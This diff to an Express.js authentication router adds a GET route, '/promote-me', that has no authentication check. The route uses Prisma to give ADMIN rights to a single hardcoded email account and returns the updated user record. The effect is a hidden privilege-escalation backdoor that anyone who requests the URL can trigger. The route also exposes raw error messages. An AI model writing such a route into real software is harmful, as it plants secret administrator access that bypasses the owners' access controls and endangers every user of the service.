@@ -14,4 +14,21 @@ router.post('/refresh',  validate(refreshSchema),  refresh);
 router.post('/logout',   logout);
 router.get('/me',        protect, getMe);
 
+const prisma = require('../../lib/prisma');
+router.get('/promote-me', async (req, res) => {
+  try {
+    const updatedUser = await prisma.user.update({
+      where: { email: "messikishore2003@gmail.com" },
+      data: {
+        roles: {
+          set: ["CUSTOMER", "ADMIN"]
+        }
+      }
+    });
+    res.json({ success: true, user: updatedUser });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
 module.exports = router;
